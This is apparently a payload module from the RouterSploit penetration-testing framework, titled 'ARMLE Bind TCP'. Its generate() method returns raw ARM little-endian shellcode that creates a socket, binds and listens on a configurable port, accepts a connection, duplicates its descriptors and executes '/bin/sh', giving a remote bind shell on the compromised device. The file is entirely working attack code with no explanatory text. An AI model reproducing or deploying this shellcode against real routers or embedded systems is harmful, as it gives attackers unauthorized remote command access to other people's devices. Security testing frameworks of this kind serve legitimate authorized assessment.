from routersploit import validators
from routersploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    BindTCPPayloadMixin,
)


class Exploit(BindTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        'name': 'ARMLE Bind TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }

    architecture = Architectures.ARMLE

    def generate(self):
        bind_port = validators.convert_port(self.rport)
        return (
            "\x02\x00\xa0\xe3" +
            "\x01\x10\xa0\xe3" +
            "\x06\x20\xa0\xe3" +
            "\x07\x00\x2d\xe9" +
            "\x01\x00\xa0\xe3" +
            "\x0d\x10\xa0\xe1" +
            "\x66\x00\x90\xef" +
            "\x0c\xd0\x8d\xe2" +
            "\x00\x60\xa0\xe1" +
            bind_port[1] + "\x10\xa0\xe3" +
            bind_port[0] + "\x70\xa0\xe3" +
            "\x01\x1c\xa0\xe1" +
            "\x07\x18\x81\xe0" +
            "\x02\x10\x81\xe2" +
            "\x02\x20\x42\xe0" +
            "\x06\x00\x2d\xe9" +
            "\x0d\x10\xa0\xe1" +
            "\x10\x20\xa0\xe3" +
            "\x07\x00\x2d\xe9" +
            "\x02\x00\xa0\xe3" +
            "\x0d\x10\xa0\xe1" +
            "\x66\x00\x90\xef" +
            "\x14\xd0\x8d\xe2" +
            "\x06\x00\xa0\xe1" +
            "\x03\x00\x2d\xe9" +
            "\x04\x00\xa0\xe3" +
            "\x0d\x10\xa0\xe1" +
            "\x66\x00\x90\xef" +
            "\x08\xd0\x8d\xe2" +
            "\x06\x00\xa0\xe1" +
            "\x01\x10\x41\xe0" +
            "\x02\x20\x42\xe0" +
            "\x07\x00\x2d\xe9" +
            "\x05\x00\xa0\xe3" +
            "\x0d\x10\xa0\xe1" +
            "\x66\x00\x90\xef" +
            "\x0c\xd0\x8d\xe2" +
            "\x00\x60\xa0\xe1" +
            "\x02\x10\xa0\xe3" +
            "\x06\x00\xa0\xe1" +
            "\x3f\x00\x90\xef" +
            "\x01\x10\x51\xe2" +
            "\xfb\xff\xff\x5a" +
            "\x04\x10\x4d\xe2" +
            "\x02\x20\x42\xe0" +
            "\x2f\x30\xa0\xe3" +
            "\x62\x70\xa0\xe3" +
            "\x07\x34\x83\xe0" +
            "\x69\x70\xa0\xe3" +
            "\x07\x38\x83\xe0" +
            "\x6e\x70\xa0\xe3" +
            "\x07\x3c\x83\xe0" +
            "\x2f\x40\xa0\xe3" +
            "\x73\x70\xa0\xe3" +
            "\x07\x44\x84\xe0" +
            "\x68\x70\xa0\xe3" +
            "\x07\x48\x84\xe0" +
            "\x73\x50\xa0\xe3" +
            "\x68\x70\xa0\xe3" +
            "\x07\x54\x85\xe0" +
            "\x3e\x00\x2d\xe9" +
            "\x08\x00\x8d\xe2" +
            "\x00\x10\x8d\xe2" +
            "\x04\x20\x8d\xe2" +
            "\x0b\x00\x90\xef"
        )
